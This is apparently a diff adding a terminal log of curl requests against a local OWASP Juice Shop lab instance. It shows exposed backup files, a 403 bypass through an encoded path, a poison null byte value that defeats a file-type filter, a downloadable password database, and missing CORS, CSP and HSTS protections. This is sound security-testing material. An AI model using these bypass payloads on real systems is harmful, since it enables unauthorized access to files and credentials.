@@ -1,0 +1,38 @@
+$ curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/ftp/package.json.bak
+403
+
+$ curl -s http://localhost:3000/%2e/ftp/package.json.bak | head -c 300   # Bypassing 403
+<!--
+  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
+  ~ SPDX-License-Identifier: MIT
+  -->
+
+<!doctype html>
+<html lang="en" data-beasties-container>
+<head>
+  <meta charset="utf-8">
+  <title>OWASP Juice Shop</title>
+  <meta name="description" content="Probably the m
+
+$ curl -s http://localhost:3000/ftp/   # directory listing of /ftp (backup files exposed)
+"quarantine" "acquisitions.md" "announcement_encrypted.md" "coupons_2013.md.bak" "eastere.gg" "encrypt.pyc" "incident-support.kdbx" "legal.md" "package-lock.json.bak" "package.json.bak" "suspicious_errors.yml" 
+
+$ curl -sI -H "Origin: https://evil.example" http://localhost:3000/rest/products/search?q=apple | grep -i "access-control\|content-security"   # CORS + CSP
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+(no Content-Security-Policy header returned)
+
+$ curl -s http://localhost:3000/ftp/package.json.bak%2500.md | head -c 250   # poison null byte bypasses the .md/.pdf filter
+{
+  "name": "juice-shop",
+  "version": "6.2.0-SNAPSHOT",
+  "description": "An intentionally insecure JavaScript Web Application",
+  "homepage": "http://owasp-juice.shop",
+  "author": "Björn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.d
+
+$ curl -s -o incident-support.kdbx -w "%{http_code} %{size_download} bytes\n" http://localhost:3000/ftp/incident-support.kdbx   # password database downloadable
+200 3246 bytes
+
+$ curl -sI http://localhost:3000/ | grep -i "^HTTP\|Strict-Transport"   # HTTP only, no HSTS
+HTTP/1.1 200 OK
+(no Strict-Transport-Security header, site served over plain HTTP)
